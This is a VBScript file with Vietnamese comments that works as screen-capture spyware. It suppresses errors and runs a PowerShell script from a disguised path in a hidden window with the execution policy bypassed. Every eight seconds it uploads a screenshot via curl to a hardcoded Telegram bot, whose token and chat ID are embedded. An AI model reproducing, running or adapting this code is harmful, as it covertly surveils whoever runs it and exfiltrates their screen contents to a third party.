On Error Resume Next
Function CheckConditionToExitLoop()
    If CreateObject("WScript.Shell").ExpandEnvironmentStrings("%SHUTDOWN%") = "TRUE" Then
        CheckConditionToExitLoop = True
    Else
        CheckConditionToExitLoop = False
    End If
End Function

Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")

Dim folderPath
' Lấy đường dẫn tới thư mục tạm
folderPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\ProgramPicture"

If Not objFSO.FolderExists(folderPath) Then
    objFSO.CreateFolder folderPath
End If

Set objFSO = Nothing

' Tạo một đối tượng WinHttpRequest
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")

' Đặt các thông tin cần thiết
BOT_TOKEN = "6948698645:AAGRSex4kCjHHKZSL8PjQsmL41wIE-Bmi30"
CHAT_ID = "7250748991"
MESSAGE = "YourMessageHere"

' Tạo URL để gửi tin nhắn
url = "https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage?chat_id=" & CHAT_ID & "&text=" & MESSAGE


' Gửi yêu cầu HTTP POST
objHTTP.Open "POST", url, False
objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objHTTP.send

' Kiểm tra và hiển thị kết quả
If objHTTP.Status <> 200 Then
    WScript.Quit
End If

' Giải phóng đối tượng WinHttpRequest
Set objHTTP = Nothing

Do
    ' Tạo đường dẫn đầy đủ tới tệp ảnh trong thư mục tạm
    Dim imagePath
    imagePath = folderPath & "\screenshot.png" ' Đã sửa lại đường dẫn để đúng

    ' Tạo một đối tượng Wscript.Shell
    Set objShell = CreateObject("WScript.Shell")
    
    ' Chạy PowerShell script
    Dim PS1File : PS1File = "C:\Users\Public\Public Sys\system_control.ps1"
    objShell.Run "powershell -ExecutionPolicy Bypass -File """ & PS1File & """", 0, True

    ' Gửi ảnh đến Telegram
    objShell.Run "cmd /c curl -F chat_id=" & CHAT_ID & " -F photo=@" & imagePath & " https://api.telegram.org/bot" & BOT_TOKEN & "/sendPhoto", 0, False

    ' Giải phóng đối tượng Shell
    Set objShell = Nothing

    ' Tạm dừng một khoảng thời gian trước khi lặp lại
    WScript.Sleep 8000 ' 8 giây

    ' Kiểm tra điều kiện để kết thúc vòng lặp
    If CheckConditionToExitLoop() Then
        Exit Do
    End If

Loop
